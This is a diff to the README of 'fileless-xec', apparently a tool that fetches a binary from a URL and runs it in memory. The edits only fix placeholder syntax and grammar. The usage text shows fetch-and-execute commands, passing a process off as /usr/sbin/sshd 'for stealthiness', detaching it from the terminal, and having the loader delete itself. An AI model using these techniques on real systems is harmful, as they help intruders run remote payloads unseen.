@@ -17,15 +17,15 @@
 
 **[➪ Install](https://github.com/ariary/fileless-xec/blob/main/install.md)**
 
- - simple usage `fileless-xec <binary_url>` (~`curl | sh` for binaries)
- - execute binary with specified program name: `fileless-xec -n /usr/sbin/sshd <binary_raw_url>`
+ - simple usage `fileless-xec [binary_url]` (~`curl | sh` for binaries)
+ - execute binary with specified program name: `fileless-xec -n /usr/sbin/sshd [binary_url]`
  - detach program execution from `tty`: ` setsid fileless-xec [...]` 
 
 ![demo](https://github.com/ariary/fileless-xec/blob/main/img/fileless-xec.gif)
 
 <details>
   <summary><b>Explanation</b></summary>
-We want to execute <code>writeNsleep</code> binary locate on a remote machine, locally. 
+We want to locally execute <code>writeNsleep</code> binary located on a remote machine. 
 
 We first start a python http server on remote.
 Locally we use <code>fileless-xec</code> and impersonate the <code>/usr/sbin/sshd</code> name for the execution of the binary <code>writeNsleep</code>(for stealthiness & fun). Once writeNsleep started fileless-xec will delete itself (<code>--self-remove</code>)
